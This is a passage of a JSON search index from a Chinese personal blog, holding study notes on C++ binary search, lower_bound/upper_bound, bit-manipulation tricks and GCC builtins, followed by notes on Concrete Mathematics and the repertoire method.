memo[key];\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u89c1\u7b97\u6cd5","title":"\u5e38\u89c1\u7b97\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4e8c\u5206\u67e5\u627e","title":"\u4e8c\u5206\u67e5\u627e","text":"<ul> <li>\u5982\u4e0a\u56fe\uff0c\u5c06\u6570\u7ec4\u67d3\u4e0a\u989c\u8272</li> <li>\u5982\u679cmid\u662f\u84dd\u8272(&lt;\u6210\u7acb)</li> <li>\u5bf9\u4e8e\u95ed\u533a\u95f4\u548c\u5de6\u95ed\u53f3\u5f00\uff0cL = mid+1</li> <li>\u5bf9\u4e8e\u5f00\u533a\u95f4, L = mid</li> <li>\u5982\u679cmid\u662f\u5176\u5b83</li> <li>\u5bf9\u4e8e\u95ed\u533a\u95f4\uff0cR = mid - 1</li> <li>\u5bf9\u4e8e\u5f00\u533a\u95f4\u548c\u5de6\u95ed\u53f3\u5f00\uff0cR = mid</li> </ul> <p>\u5faa\u73af\u4e0d\u53d8\u91cf \u95ed\u533a\u95f4 - L - 1 = \u84dd\u8272 - R + 1 = \u7ea2\u8272 - \u7ed3\u675f\u65f6 L = R + 1 \u5de6\u95ed\u53f3\u5f00 - L - 1 = \u84dd\u8272 - R = \u7ea2\u8272 - \u7ed3\u675f\u65f6 L = R \u5f00\u533a\u95f4 - L  = \u84dd\u8272 - R = \u7ea2\u8272 - \u7ed3\u675f\u65f6 L = R - 1</p> <p>\u5de7\u5999\u8f6c\u6362\u6210\u4e8c\u5206\u67e5\u627e\u95ee\u9898\uff1a786. \u7b2c K \u4e2a\u6700\u5c0f\u7684\u7d20\u6570\u5206\u6570 </p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7b80\u5355\u7c7b\u578bcomp\u5b9a\u4e49","title":"\u7b80\u5355\u7c7b\u578bcomp\u5b9a\u4e49","text":"<p>\u4e09\u79cd\uff1f - \u51fd\u6570\u5bf9\u8c61 - lambda\u8868\u8fbe\u5f0f - \u51fd\u6570\u6307\u9488</p> <pre><code>upper_bound(nums1_dec.begin(), nums1_dec.end(), x, std::greater&lt;int&gt;());\n\n// std::less\n</code></pre> <p>\u8fd9\u91cc\u7684<code>greater()</code>\u662f\u51fd\u6570\u5bf9\u8c61\uff1aGenerically,\u00a0function objects\u00a0are instances of a class with member function\u00a0operator()\u00a0defined. \u5b9e\u73b0 <pre><code>template &lt;class T&gt; struct greater {\n  bool operator() (const T&amp; x, const T&amp; y) const {return x&gt;y;}\n  typedef T first_argument_type;\n  typedef T second_argument_type;\n  typedef bool result_type;\n};\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u590d\u6742\u7c7b\u578bcomp\u5b9a\u4e49","title":"\u590d\u6742\u7c7b\u578bcomp\u5b9a\u4e49","text":"<pre><code>vector&lt;vector&lt;int&gt;&gt; &amp;fruits;\n\n// lower_bound\u548cupper_bound\u81ea\u5b9a\u4e49&lt;\u65f6\u53c2\u6570\u4e0d\u4e00\u6837\u3002\nauto compare_fruit1 = [](vector&lt;int&gt; &amp;a, int val){\n    return a[0] &lt; val;\n};\nauto compare_fruit2 = [](int val, vector&lt;int&gt; &amp;a){\n    return val &lt; a[0];\n};\n\nint start_ge_min = lower_bound(fruits.begin(), fruits.end(), startPos, compare_fruit1) - fruits.begin();\nint start_le_max = upper_bound(fruits.begin(), fruits.end(), startPos, compare_fruit2) - fruits.begin() - 1;\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#lower_boundupper_bound\u5b9e\u73b0","title":"lower_bound/upper_bound\u5b9e\u73b0","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u542b\u4e49\u603b\u7ed3","title":"\u542b\u4e49\u603b\u7ed3","text":"<ul> <li>\u9012\u589e\u5e8f\u5217\uff08\u975e\u9012\u51cf\uff09</li> <li>lower_bound\uff0c\u8fd4\u56de&gt;= val\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de&gt;val\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>\u9012\u51cf\u5e8f\u5217</li> <li>lower_bound\uff0c\u8fd4\u56de&lt;= val\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de&lt;val\u7684\u6700\u5c0f\u7d22\u5f15 \u5373\uff1a</li> <li>lower_bound\uff0c\u8fd4\u56de\u6392\u5e8f\u5728val\u81ea\u8eab\u53ca\u53f3\u4fa7\u5143\u7d20\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>upper_bound\uff0c\u8fd4\u56de\u6392\u5e8f\u5728val\u53f3\u4fa7\u5143\u7d20\u7684\u6700\u5c0f\u7d22\u5f15</li> <li>\u6839\u636e\u9012\u589e\u548c\u9012\u51cf\uff0c\u4f20\u5165<code>&lt;</code>\u6216<code>&gt;</code>\u6bd4\u8f83\u7b26\u53f7\u3002\u4e0d\u80fd\u4f20\u5165\u542b\u7b49\u4e8e\u7684\u6bd4\u8f83\u7b26\u53f7\uff0c\u5426\u5219lower_bound\u548cupper_bound\u542b\u4e49\u4e92\u6362\u3002</li> <li>cmp\u51fd\u6570\u8fd4\u56detrue\uff0c\u8868\u793a\u524d\u4e00\u4e2a\u5143\u7d20\u5e94\u8be5\u51fa\u73b0\u5728\u540e\u4e00\u4e2a\u5143\u7d20\u5de6\u4fa7\u3002\u611f\u89c9\u6ca1\u6709\u4ec0\u4e48\u60c5\u51b5\u662f\u9700\u8981\u7528\u5230cmp\u5305\u542b\u7b49\u4e8e\u60c5\u51b5\u7684\u3002</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b9e\u73b0\u89c4\u5f8b\u603b\u7ed3","title":"\u5b9e\u73b0\u89c4\u5f8b\u603b\u7ed3","text":"<ul> <li>right\u8981\u66f4\u65b0\u6c38\u8fdc\u90fd\u662f\u66f4\u65b0\u4e3amid</li> <li>left\u6839\u636e\u53cd\u9762\u60c5\u51b5\u66f4\u65b0\u4e3amid+1</li> <li>\u9012\u589e\u5e8f\u5217\uff1a<ul> <li>lower_bound\u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &lt; val\uff0c\u6545<code>if (comp(*it,val))</code></li> <li>upper_bound\u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &lt;= val, \u6545\u53ea\u7528\u5c0f\u4e8e\u53f7\u8868\u793a\u4e3a<code>if (!comp(val,*it))</code></li> </ul> </li> <li> <p>\u9012\u51cf\u5e8f\u5217\uff1a</p> <ul> <li>lower_boundf\u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &gt; val\uff0c\u6545<code>if (comp(*it,val))</code></li> <li>upper_bound\u53cd\u9762\u60c5\u51b5\u4e3a\uff1amid &gt;= val\uff0c\u6545\u53ea\u7528\u5927\u4e8e\u53f7\u8868\u793a\u4e3a`if (!comp(val,*it))</li> </ul> </li> <li> <p>\u8fd4\u56de\u7684\u7d22\u5f15\u5728<code>[0, n]</code>\uff0c\u5f53\u53d6\u5230n\u65f6\u8868\u793a\u7b26\u5408\u6761\u4ef6\u7684\u6ca1\u627e\u5230\u3002</p> </li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5b9e\u73b0","title":"\u5b9e\u73b0","text":"<p>\u611f\u89c9\u5728T\u662f\u57fa\u672c\u7c7b\u578b\uff0c&lt;\u53f7\u5f88\u660e\u786e\u7684\u60c5\u51b5\u4e0b\uff0clower_bound\u548cupper_bound\u9700\u8981\u5b9a\u4e49\u4e0d\u540c\u7684\u51fd\u6570\u5c31\u6bd4\u8f83\u53cd\u76f4\u89c9\u3002 - \u53ef\u4ee5\u628aCompare\u51fd\u6570\u6362\u6210get\u51fd\u6570\uff0c\u8fd9\u6837\u53d8\u6210<code>get(\\*it) &lt; val</code> <pre><code>template &lt;class ForwardIterator, class T&gt;\n  ForwardIterator lower_bound (ForwardIterator first, ForwardIterator last, const T&amp; val)\n{\n  ForwardIterator it;\n  iterator_traits&lt;ForwardIterator&gt;::difference_type count, step;\n  count = distance(first,last);\n  while (count&gt;0)\n  {\n    it = first; step=count/2; advance (it,step);\n    if (*it&lt;val) {                 // or: if (comp(*it,val)), for version (2)\n      first=++it;\n      count-=step+1;\n    }\n    else count=step;\n  }\n  return first;\n}\n\ntemplate &lt;class ForwardIterator, class T&gt;\n  ForwardIterator upper_bound (ForwardIterator first, ForwardIterator last, const T&amp; val)\n{\n  ForwardIterator it;\n  iterator_traits&lt;ForwardIterator&gt;::difference_type count, step;\n  count = std::distance(first,last);\n  while (count&gt;0)\n  {\n    it = first; step=count/2; std::advance (it,step);\n    if (!(val&lt;*it))                 // or: if (!comp(val,*it)), for version (2)\n      { first=++it; count-=step+1;  }\n    else count=step;\n  }\n  return first;\n}\n</code></pre></p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u52a8\u6001\u89c4\u5212","title":"\u52a8\u6001\u89c4\u5212","text":"<p>\u56fe\u89e3\u52a8\u6001\u89c4\u5212\u7684\u89e3\u9898\u56db\u6b65\u9aa4\uff08C++/Java/Python\uff09 - \u6253\u5bb6\u52ab\u820d - \u529b\u6263\uff08LeetCode\uff09 -   \u5b9a\u4e49\u5b50\u95ee\u9898 -   \u5199\u51fa\u5b50\u95ee\u9898\u7684\u9012\u63a8\u5173\u7cfb -   \u786e\u5b9a DP \u6570\u7ec4\u7684\u8ba1\u7b97\u987a\u5e8f -   \u7a7a\u95f4\u4f18\u5316\uff08\u53ef\u9009\uff09</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f4d\u8fd0\u7b97","title":"\u4f4d\u8fd0\u7b97","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"<p>\u5206\u4eab\uff5c\u4ece\u96c6\u5408\u8bba\u5230\u4f4d\u8fd0\u7b97\uff0c\u5e38\u89c1\u4f4d\u8fd0\u7b97\u6280\u5de7\u5206\u7c7b\u603b\u7ed3\uff01 - \u529b\u6263\uff08LeetCode\uff09</p> <pre><code>(1&lt;&lt;n) - 1  //\u5f97\u5230n\u4f4d\u8fde\u7eed\u76841\nx &amp; (-x)   // \u627e\u51fax\u7684\u4e8c\u8fdb\u5236\u8868\u793a\u4e2d\u7684\u6700\u4f4e\u4f4d\u76841\u7684\u4f4d\u7f6e\uff0c\u5f97\u5230\u7684\u503c\u9664\u8be5\u4f4d\u5916\u51680\nx &amp; (x - 1) //\u5c06 x \u6700\u4f4e\u4f4d\u76841\u7f6e\u4e3a0\n</code></pre> <ul> <li>x &amp; (-x) \u539f\u7406\u5728\u4e8e-x\u662f\u8865\u7801\uff0c\u8fdb\u884c\u5bf9x\u53d6\u53cd+1\u64cd\u4f5c\u3002\u4e8c\u8fdb\u5236\u4e0a\uff0c\u53ef\u4ee5\u603b\u7ed3\u51fa\u53d8\u5316\u89c4\u5f8b\uff1a\u6700\u4f4e\u4f4d1\u4e0d\u53d8\uff0c\u5de6\u4fa7\u5168\u90e8\u53d6\u53cd\u3002\u56e0\u6b64\u4e0e\u540e\uff0c\u53ea\u6709\u6700\u4f4e\u4f4d1\u4fdd\u6301\u4e0d\u53d8\uff0c\u5176\u5b83\u5168\u4e3a0.</li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#gospers-hack","title":"Gosper's hack","text":"<p><pre><code>void GospersHack(int k, int n)\n{\n    int set = (1 &lt;&lt; k) - 1;\n    int limit = (1 &lt;&lt; n);\n    while (set &lt; limit)\n    {\n        DoStuff(set);\n\n        // Gosper's hack:\n        int c = set &amp; - set;\n        int r = set + c;\n        set = (((r ^ set) &gt;&gt; 2) / c) | r;\n    }\n}\n</code></pre> ProgrammingForInsomniacs: Gosper's Hack Explained</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#popcount","title":"popcount","text":"<pre><code>unsigned int popcount64(unsigned long long x)\n{\n    x = (x &amp; 0x5555555555555555ULL) + ((x &gt;&gt; 1) &amp; 0x5555555555555555ULL);\n    x = (x &amp; 0x3333333333333333ULL) + ((x &gt;&gt; 2) &amp; 0x3333333333333333ULL);\n    x = (x &amp; 0x0F0F0F0F0F0F0F0FULL) + ((x &gt;&gt; 4) &amp; 0x0F0F0F0F0F0F0F0FULL);\n    return (x * 0x0101010101010101ULL) &gt;&gt; 56;\n}\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#clz-ctz","title":"clz, ctz","text":"<p>\u8ba1\u7b97\u5934\u5c3e0\u7684\u4e2a\u6570 - clz(count leading zero) - ctz(count trailing zero)</p> <p>https://stackoverflow.com/a/34687453 - x86 BSF(bit scan forward)\uff1a\u00a0least significant set bit (1 bit) - x86 BSR(bit scan reverse)\uff1a\u83b7\u5f97most significant set bit (1 bit) index\u3002\u6ce8\u610f\uff0c\u5982\u679csrc \u4e3a0\uff0c\u5219\u8fd4\u56de\u503c\u672a\u5b9a\u4e49\u3002   - BSR \u2014 Bit Scan Reverse (felixcloutier.com)</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u500d\u589e","title":"\u500d\u589e","text":"<pre><code>    int getKthAncestor(int node, int k) {\n        int p = 0;\n        while(k){\n            if(k&amp;1){\n                node = getAncestorPower2(node, p);\n                if(node==-1){\n                    return -1;\n                }\n            }\n            p++;\n            k&gt;&gt;=1;\n        }\n        return node;\n    }\n</code></pre> <pre><code>//https://leetcode.cn/problems/kth-ancestor-of-a-tree-node/solution/mo-ban-jiang-jie-shu-shang-bei-zeng-suan-v3rw/\n    int getKthAncestor(int node, int k) {\n        int m = 32 - __builtin_clz(k); // k \u7684\u4e8c\u8fdb\u5236\u957f\u5ea6\n        for (int i = 0; i &lt; m; i++) {\n            if ((k &gt;&gt; i) &amp; 1) { // k \u7684\u4e8c\u8fdb\u5236\u4ece\u4f4e\u5230\u9ad8\u7b2c i \u4f4d\u662f 1\n                node = pa[node][i];\n                if (node &lt; 0) break;\n            }\n        }\n        return node;\n    }\n\n    // \u53e6\u4e00\u79cd\u5199\u6cd5\uff0c\u4e0d\u65ad\u53bb\u6389 k \u7684\u6700\u4f4e\u4f4d\u7684 1\n    int getKthAncestor2(int node, int k) {\n        for (; k &amp;&amp; node != -1; k &amp;= k - 1) // k &amp; (k-1)\n            node = pa[node][__builtin_ctz(k)];\n        return node;\n    }\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5e38\u7528\u51fd\u6570","title":"\u5e38\u7528\u51fd\u6570","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u7f16\u8bd1\u5668\u5185\u7f6e\u51fd\u6570","title":"\u7f16\u8bd1\u5668\u5185\u7f6e\u51fd\u6570","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u4f4d\u8fd0\u7b97_1","title":"\u4f4d\u8fd0\u7b97","text":"<p>GUN GCC\u5185\u7f6e\u51fd\u6570 <pre><code>__builtin_popcount = int\n__builtin_popcountl = long int\n__builtin_popcountll = long long\n\n\n__builtin_clz   # countl_zero\n__builtin_ctz   # countr_zero\n\n__builtin_clzll\n</code></pre></p> <p>c++ 20\u5747\u53d8\u4e3a\u6807\u51c6\u51fd\u6570 - leetcode\u76ee\u524d\u8fd8\u65e0\u6cd5\u4f7f\u7528</p> <p>popcount <pre><code>template&lt;\u00a0class\u00a0T\u00a0&gt;  \nconstexpr\u00a0int\u00a0popcount(\u00a0T x\u00a0)\u00a0noexcept;\n</code></pre></p> <ul> <li>countl_zero</li> <li>countr_zero</li> <li>countl_one</li> <li>countr_one <pre><code>popcount( 00000000 ) = 0\npopcount( 11111111 ) = 8\npopcount( 00011101 ) = 4\n\ncountl_zero( 00000000 ) = 8\ncountl_zero( 11111111 ) = 0\ncountl_zero( 11110000 ) = 0\ncountl_zero( 00011110 ) = 3\n\ncountr_zero( 00000000 ) = 8\ncountr_zero( 11111111 ) = 0\ncountr_zero( 00011100 ) = 2\ncountr_zero( 00011101 ) = 0\n</code></pre></li> </ul>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#lg","title":"lg","text":"<ul> <li>bit_width = 1 + floor(log2(x)),  0 when x = 0</li> <li>floor(log2(x)) = bit_width - 1,      max k, 2^k &lt;= x</li> <li>int: bit_width = 32 - countl_zero(x)</li> </ul> <p>c++20 <pre><code>template&lt;\u00a0class\u00a0T\u00a0&gt;  \nconstexpr\u00a0int\u00a0bit_width(\u00a0T x\u00a0)\u00a0noexcept;\n</code></pre></p> <pre><code>__lg\n\n\nbit_width = 32 - __builtin_clz(x);\n</code></pre>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u9ed1\u9b54\u6cd5","title":"\u9ed1\u9b54\u6cd5","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#\u5404\u79cd\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784","title":"\u5404\u79cd\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#deque","title":"deque","text":"<p>\u548cvector\u4e00\u6837\uff0c\u652f\u6301\u968f\u673a\u8bbf\u95ee\u3002\u4f46\u662f\u53c8\u53ef\u4ee5\u5728\u5934\u90e8\u63d2\u5165\u5220\u9664\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e2a\u7279\u6027\uff0c\u5e95\u5c42\u5b9e\u73b0\u6bd4\u8f83\u590d\u6742\u3002 cplusplus.com/reference/deque/deque/ \u9002\u7528\uff1a - \u5bf9\u4e8e\u975e\u5e38\u957f\u7684\u5e8f\u5217\uff0creallocations\u5f00\u9500\u5f88\u5927\uff0c\u56e0\u6b64\u6bd4vector\u66f4\u9002\u5408\u3002</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#sortedlistorder-statistic-tree","title":"SortedList/order statistic tree","text":"<ul> <li>C++ tree find_by_order: C++ STL: Policy based data structures - Codeforces</li> <li>python sorted list: Sorted List \u2014 Sorted Containers 2.4.0 documentation (grantjenks.com)</li> </ul> <p>\u4f7f\u7528pb_ds\u7684tree - \u6ed1\u52a8\u5b50\u6570\u7ec4\u7684\u7f8e\u4e3d\u503c - \u529b\u6263\uff08LeetCode\uff09 \u6a21\u62df - \u6ed1\u52a8\u5b50\u6570\u7ec4\u7684\u7f8e\u4e3d\u503c - \u529b\u6263\uff08LeetCode\uff09</p> <p>Order Statistic Tree \u2013 Morse (zheolong.github.io) -   Select(i) \u2014\u2014 \u67e5\u627e\u6811\u4e2d\u7684\u7b2c_i_\u4e2a\u6700\u5c0f\u5143\u7d20\uff1b -   Rank(x) \u2014\u2014 \u67e5\u627e\u5143\u7d20_x_\u5728\u6811\u4e2d\u7684\u6b21\u5e8f\u3002</p> <p>\u5220\u9664heap\u4e2d\u6307\u5b9a\u5143\u7d20\uff1a - \u65b9\u6cd5\u4e00\uff1a\u7ef4\u62a4\u4e00\u4e2adelete set\uff0c\u6709\u70b9\u50cflazy remove - \u65b9\u6cd5\u4e8c\uff1anode based prior queue How to remove an arbitrary element from a standard heap in c++? - Stack Overflow</p>","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#cc-error-prone","title":"C/C++ error prone","text":"","tags":["C","C++"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/20/2023-04-20-C%26C%2B%2B/#ieee754","title":"IEEE754","text":"<p>\u8868\u793a - sign: s - significand: M - exponet: E $$ (-1)^s M 2 ^ E $$</p> <p>\u4f4d\u6570 - float(32): 1 + 8 + 23 - double(64): 1 + 11 + 52 - extend(80), intel: 1  + 15  + 64</p> <p>\u533a\u95f4\u8868\u793a\uff1a - normailized: exp\u4e0d\u5168\u4e3a0\u62161   - \u51680 </p>","tags":["C","C++"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/","title":"\u5177\u4f53\u6570\u5b66","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5177\u4f53\u6570\u5b66\u516c\u5f0f\u5c0f\u518c\u5b50","title":"\u5177\u4f53\u6570\u5b66\u516c\u5f0f\u5c0f\u518c\u5b50","text":"<p>\u63a8\u5e7f\u4e00\u4e2a\u81ea\u5df1\u7684github\u4ed3\u5e93\uff0c\u671f\u671b\u5171\u540c\u5b8c\u5584\u3002 \u9605\u8bfb\u5177\u4f53\u6570\u5b66\u7535\u5b50\u4e66\u7c4d\u65f6\uff0c\u7531\u4e8e\u7ecf\u5e38\u9700\u8981\u67e5\u770b\u67d0\u4e2a\u7f16\u53f7\u7684\u516c\u5f0f\u56e0\u6b64\u4ea7\u751f\u4e86\u8fd9\u4e2a\u9879\u76ee\uff0c\u7528\u4e8e\u9605\u8bfb\u65f6\u67e5\u9605\u516c\u5f0f https://github.com/TheRainstorm/concrete_math_formulas</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6210\u5957\u65b9\u6cd5","title":"\u6210\u5957\u65b9\u6cd5","text":"<p>\u5728\u5177\u4f53\u6570\u5b66(Concrete Mathematics)\u8bfe\u672c\u4e2d\uff0c\u5728\u89e3\u7ea6\u745f\u592b\u9012\u63a8\u65b9\u7a0b\u65f6\uff0c\u7b2c\u4e00\u6b21\u4ecb\u7ecd\u4e86\u6210\u5957\u65b9\u6cd5(repertoire method)\u3002\u4e4b\u540e\u4e5f\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\u6c42\u89e3\u5404\u79cd\u9012\u63a8\u65b9\u7a0b\u3002\u76f8\u4fe1\u5f88\u591a\u4eba\u7b2c\u4e00\u6b21\u770b\u5230\u8fd9\u79cd\u65b9\u6cd5\u65f6\u90fd\u4f1a\u611f\u89c9\u5230\u4e0d\u53ef\u601d\u8bae\u2014\u2014\u8fd8\u80fd\u8fd9\u6837\uff1f\u867d\u7136\u6bcf\u4e00\u6b65\u90fd\u80fd\u770b\u61c2\uff0c\u4f46\u662f\u5c31\u662f\u4e0d\u77e5\u9053\u8fd9\u79cd\u65b9\u6cd5\u662f\u600e\u4e48\u60f3\u5230\u7684\u3002\u5728\u67e5\u9605\u4e86\u4e00\u70b9\u8d44\u6599\u540e\uff0c\u6211\u5bf9\u8be5\u65b9\u6cd5\u6709\u4e86\u66f4\u591a\u7684\u8ba4\u8bc6\u3002\u5148\u8bf4\u660e\u4e00\u70b9\uff0c\u8be5\u65b9\u6cd5\u5e76\u4e0d\u662f\u4e00\u79cd\u4e07\u80fd\u65b9\u6cd5\uff0c\u5b9e\u9645\u4e0a\u8981\u6c42\u95ee\u9898\u8981\u6709\u7ebf\u6027\u7ed3\u6784\u3002</p> <p>\u53c2\u8003\uff1alinear algebra - Mathematical explanation for the Repertoire Method - Mathematics Stack Exchange</p> <ul> <li>\u4e3b\u8981\u601d\u8def\u662f\u7531\u7279\u89e3\u6784\u9020\u4e00\u822c\u89e3</li> <li>\u7b80\u5355\u7684\uff0c\u4ee5$$ x_n = a_n + x_{n-1}$$     \u5219\u5bf9\u4e8e     $$     z_n = \\alpha a_n + \\beta b_n + z_{n-1}     $$     \\(z_n\\)\u7684\u89e3\u4e3a     $$     z_n = \\alpha x_n + \\beta y_n     $$</li> <li> <p>\u63a8\u5e7f\u540e     \u5bf9\u4e8e\u4ee5\u4e0b\u6c42\u89e3\\(x_n\\)\u7684\u95ee\u9898     $$     x_n = f(n) + g(x_{n-1}, x_{n-2}, ..., x_1)     $$     \u5176\u4e2d\\(g()\\)\u662f\u4e00\u4e2a\u7ebf\u6027\u51fd\u6570</p> <p>\u6784\u9020\u51fa\\(k\\)\u4e2arepertoire\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u7279\u89e3\uff09 $$ x_n^l = f^l(n) + g(x^l_{n-1}, x^l_{n-2}, ..., x^l_1), 0\\le l \\lt k $$ \u4f7f\u5f97\u53ef\u4ee5 $$ f(n) = \\sum_{0\\le l \\lt k} \\lambda_l f^l(n) $$ \u4ece\u800c $$ x_n = \\sum_{0\\le l \\lt k} \\lambda_l x_n^l $$ - \u5bf9\u4e8e\u539f\u672c\u7684\u7ea6\u745f\u592b\u95ee\u9898 $$ \\left{\\begin{array}{l} f(1) = a \\ f(2n) = 2f(n) + b\\ f(2n+1) = 2f(n) + c\\ \\end{array}\\right. $$ \u6709 $$ f(n) = aA(n) + bB(n) + cC(n) $$ \u56e0\u6b64\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684a, b, c\u7684\u7ebf\u6027\u7ec4\u5408\uff0c\u53ef\u4ee5\u5f97\u5230\u65b0\u7684\u9012\u63a8\u65b9\u7a0b\uff0c\u5176\u89e3\u4e5f\u662f\u4e0d\u540c\u7279\u89e3f(n)\u7684\u7ebf\u6027\u7ec4\u5408</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e94\u7528","title":"\u5e94\u7528","text":"<p>\u6c42\u89e3\u4e09\u6570\u53d6\u4e2d\u4f4d\u6570\u7248\u672c\u7684\u5feb\u901f\u6392\u5e8f\uff0c\u6bd4\u8f83\u6b21\u6570\u3002\u9012\u63a8\u516c\u5f0f\u5f88\u590d\u6742\uff0c\u4f46\u662f\u5374\u53ef\u4ee5\u5e94\u7528\u6210\u5957\u65b9\u6cd5\uff1alinear algebra - Mathematical explanation for the Repertoire Method - Mathematics Stack Exchange $$ x_{n}=n+1+\\frac{1}{\\left(\\begin{array}{c} n \\ 3 \\end{array}\\right)} \\sum_{1 \\leq k \\leq n}(k-1)(n-k)\\left(x_{k-1}+x_{n-k}\\right) $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6d4b\u8bd5mathjax\u548ckatex","title":"\u6d4b\u8bd5MathJax\u548cKaTex","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#block","title":"block","text":"<pre><code>$$\n    x_n = a_n + x_{n-1} \\\\\n    y_n = b_n + y_{n-1} \\\\\n$$\n</code></pre> \\[     x_n = a_n + x_{n-1} \\\\     y_n = b_n + y_{n-1} \\\\ \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#aligned","title":"aligned","text":"<pre><code>$$\n\\begin{align*}\n    \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\\\\n        &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\\\\n        &amp;= \\sum_{1\\le j\\le n} 2^j(2^{n-j+1} - 1) \\\\\n        &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\\\\n        &amp;= n2^{n+1} - 2(2^n - 1) \\\\\n        &amp;= (n-1)2^{n+1}+2 \\\\\n\\end{align*}\n$$\n</code></pre> \\[ \\begin{align*}     \\sum_{k=1}^{n} k2^k &amp;= \\sum_{1\\le j\\le k \\le n} 2^k \\\\         &amp;= \\sum_{1\\le j\\le n} \\sum_{j \\le k \\le n} 2^k  &amp;&amp; \\text{//\u8003\u8651j, k \u8303\u56f4\u6784\u6210\u7684\u4e09\u89d2\u5f62}\\\\         &amp;= \\sum_{1\\le j\\le n} 2^j(2^{n-j+1} - 1) \\\\         &amp;= \\sum_{1\\le j\\le n} 2^{n+1} - 2^j \\\\         &amp;= n2^{n+1} 